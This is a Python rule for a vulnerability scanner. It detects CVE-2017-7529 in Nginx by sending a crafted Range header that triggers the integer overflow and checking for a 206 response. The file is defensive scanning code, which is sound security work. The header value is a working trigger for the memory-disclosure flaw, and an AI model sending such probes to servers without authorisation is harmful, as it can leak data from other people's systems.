from core.parser import ScanParser
from core.redis import rds
from core.rules import BaseRule
from core.triage import Triage


class Rule(BaseRule):
    def __init__(self):
        super().__init__()
        self.rule = 'CVE_C2CF'
        self.rule_severity = 2
        self.rule_description = 'This rule checks for Nginx Vulnerability (CVE-2017-7529)'
        self.rule_confirm = 'Nginx Integer Overflow Vulnerability'
        self.rule_details = ''
        self.rule_mitigation = (
            'Patch Nginx to the latest version. '
            'Refer to the following CVE advisory for more information: '
            'https://nvd.nist.gov/vuln/detail/CVE-2017-7529'
        )
        self.intensity = 1

    def check_rule(self, ip, port, values, conf):
        scan_parser = ScanParser(port, values)

        if not scan_parser.is_module('http'):
            return

        triage = Triage()
        response = triage.http_request(ip, port, normalize_headers=True)

        if not response:
            return

        server_header = response.normalized_headers.get('server', None)
        if not server_header or 'nginx' not in server_header.lower():
            return

        content_length = response.normalized_headers.get('content-length', 0)
        bytes_length = int(content_length) + 623
        content_length = "bytes=-%d,-9223372036854%d" % (bytes_length, 776000 - bytes_length)

        response = triage.http_request(ip, port, headers={'Range': content_length})
        if not response:
            return

        if response.status_code == 206 and 'Content-Range' in response.text:
            self.rule_details = 'Identified Nginx Integer Overflow (CVE-2017-7529) via Content-Range headers'
            domain = scan_parser.get_domain()
            vuln_dict = self.get_vuln_dict(ip, port, domain)
            rds.store_vuln(vuln_dict)
